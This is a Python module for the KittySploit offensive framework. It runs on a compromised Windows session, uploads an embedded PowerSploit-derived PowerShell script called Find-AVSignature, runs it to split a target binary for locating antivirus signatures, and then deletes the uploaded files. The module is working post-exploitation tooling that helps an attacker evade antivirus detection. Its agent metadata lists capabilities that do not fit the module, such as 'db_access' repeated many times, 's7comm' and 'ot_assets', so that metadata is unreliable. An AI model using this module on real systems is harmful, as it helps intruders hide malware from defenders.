#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import re

from lib.post.windows.session import WindowsSessionMixin


class Module(Post, WindowsSessionMixin):
    _DEFAULT_BUFFER_LEN = 65536
    _DEFAULT_FORCE = True
    _AUTO_CLEANUP = True

    __info__ = {
        "name": "Windows Find AV Signature",
        "description": (
            "Locate tiny AV signatures by generating progressive binary splits on a Windows "
            "shell or Meterpreter session."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "http://obscuresecurity.blogspot.com/2012/12/finding-simple-av-signatures-with.html",
            "https://github.com/mattifestation/PowerSploit",
        ],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    target_path = OptString("", "Target binary path on remote host", True)
    interval = OptInteger(10000, "Split interval size", False)
    start_byte = OptInteger(0, "First byte index to begin splitting", False)
    end_byte = OptString("max", "Last byte index or 'max'", False)

    def _powershell_script(self) -> str:
        return r"""
function Find-AVSignature
{
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateRange(0,4294967295)]
        [UInt32]
        $StartByte,

        [Parameter(Mandatory = $True)]
        [String]
        $EndByte,

        [Parameter(Mandatory = $True)]
        [ValidateRange(1,4294967295)]
        [UInt32]
        $Interval,

        [Parameter(Mandatory = $True)]
        [String]
        [ValidateScript({Test-Path $_ })]
        $Path,

        [String]
        $OutPath = "",

        [ValidateRange(1,2097152)]
        [UInt32]
        $BufferLen = 65536,

        [Switch] $Force
    )

    if (!(Test-Path $Path)) { throw "File path not found" }
    if (!(Get-ChildItem -LiteralPath $Path).Exists) { throw "File not found" }

    if ([String]::IsNullOrWhiteSpace($OutPath)) {
        $OutPath = Split-Path -LiteralPath $Path -Parent
    }

    $Response = $True
    if (!(Test-Path $OutPath)) {
        if ($Force -or ($Response = $psCmdlet.ShouldContinue("The `"$OutPath`" does not exist! Do you want to create the directory?",""))) {
            New-Item -Path $OutPath -ItemType Directory | Out-Null
        }
    }
    if (!$Response) { throw "Output path not found" }

    [Int64]$FileSize = (Get-ChildItem -LiteralPath $Path).Length
    if ($FileSize -le 0) { throw "Input file is empty" }

    if ($StartByte -gt ($FileSize - 1)) { throw "StartByte range must be between 0 and $($FileSize - 1)" }
    [Int64] $MaximumByte = $FileSize - 1

    if ($EndByte -ceq "max") { $EndByte = $MaximumByte }
    [Int64]$EndByte = [Int64]$EndByte

    if ($EndByte -gt $MaximumByte) { $EndByte = $MaximumByte }
    if ($EndByte -lt $StartByte) { $EndByte = [Int64]$StartByte + [Int64]$Interval }
    if ($EndByte -gt $MaximumByte) { $EndByte = $MaximumByte }

    Write-Verbose "StartByte: $StartByte"
    Write-Verbose "EndByte: $EndByte"

    [String] $FileName = [System.IO.Path]::GetFileNameWithoutExtension($Path)
    [Int64] $ResultNumber = [Math]::Floor(($EndByte - $StartByte) / $Interval)
    if ((($EndByte - $StartByte) % $Interval) -gt 0) { $ResultNumber = $ResultNumber + 1 }

    $Response = $True
    if ($Force -or ($Response = $psCmdlet.ShouldContinue("This script will result in $ResultNumber binaries being written to `"$OutPath`"!",
             "Do you want to continue?"))) { }
    if (!$Response) { return }

    Write-Verbose "This script will now write $ResultNumber binaries to `"$OutPath`"."
    [Byte[]] $ReadBuffer = New-Object byte[] $BufferLen
    [System.IO.FileStream] $ReadStream = New-Object System.IO.FileStream($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read, $BufferLen)

    try {
        for ([Int64]$i = 0; $i -le $ResultNumber; $i++) {
            if ($i -eq $ResultNumber) { [Int64]$SplitByte = $EndByte }
            else { [Int64]$SplitByte = [Int64]$StartByte + ([Int64]$Interval * $i) }

            Write-Verbose "Byte 0 -> $($SplitByte)"
            $ReadStream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null

            [String] $OutFile = Join-Path $OutPath "$($FileName)_$($SplitByte).bin"
            [System.IO.FileStream] $WriteStream = New-Object System.IO.FileStream($OutFile, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None, $BufferLen)

            try {
                [Int64] $BytesLeft = $SplitByte
                while ($BytesLeft -gt $BufferLen) {
                    [Int32]$Count = $ReadStream.Read($ReadBuffer, 0, $BufferLen)
                    if ($Count -le 0) { break }
                    $WriteStream.Write($ReadBuffer, 0, $Count)
                    $BytesLeft = $BytesLeft - $Count
                }

                while ($BytesLeft -gt 0) {
                    [Int32]$ReadSize = [Math]::Min($BufferLen, [Int32]$BytesLeft)
                    [Int32]$Count = $ReadStream.Read($ReadBuffer, 0, $ReadSize)
                    if ($Count -le 0) { break }
                    $WriteStream.Write($ReadBuffer, 0, $Count)
                    $BytesLeft = $BytesLeft - $Count
                }
            }
            finally {
                $WriteStream.Close()
                $WriteStream.Dispose()
            }
        }
    }
    finally {
        $ReadStream.Dispose()
    }

    [System.GC]::Collect()
    Write-Verbose "Completed!"
}
"""

    def _validate_options(self):
        if self.start_byte < 0:
            raise ProcedureError(FailureType.ConfigurationError, "start_byte must be >= 0")
        if self.interval <= 0:
            raise ProcedureError(FailureType.ConfigurationError, "interval must be > 0")
        if not str(self.target_path or "").strip():
            raise ProcedureError(FailureType.ConfigurationError, "target_path is required")

    def check(self):
        return self.win_require_powershell()

    def run(self):
        self._validate_options()
        if not self.check():
            return False

        temp_dir = self.win_remote_temp_dir()
        print_status("Uploading Find-AVSignature payload...")
        script_path, blob_path = self.win_write_remote_script(
            self._powershell_script(),
            temp_dir,
            "find_av_signature",
        )

        end_value = str(self.end_byte).strip() if str(self.end_byte).strip() else "max"
        remote_target = self.win_ps_single_quote(str(self.target_path).strip())
        remote_end = self.win_ps_single_quote(end_value)

        invoke = (
            "$ErrorActionPreference='Stop';"
            f". '{self.win_ps_single_quote(script_path)}';"
            "Find-AVSignature "
            f"-StartByte {int(self.start_byte)} "
            f"-EndByte '{remote_end}' "
            f"-Interval {int(self.interval)} "
            f"-Path '{remote_target}' "
            f"-BufferLen {int(self._DEFAULT_BUFFER_LEN)} "
            f"{'-Force' if self._DEFAULT_FORCE else ''} "
            "-Verbose *>&1 | Out-String"
        )

        print_status("Running Find-AVSignature on target...")
        result = self.win_run_powershell(invoke, timeout=120)

        if self._AUTO_CLEANUP:
            self.win_delete_remote([script_path, blob_path])

        if not result:
            raise ProcedureError(FailureType.Unknown, "No output was returned by Find-AVSignature")

        if re.search(r"(Exception|Cannot|error|failed)", result, re.I):
            print_warning("PowerShell reported potential issues during execution")

        print_success("Find-AVSignature completed")
        print_info(result)
        return True
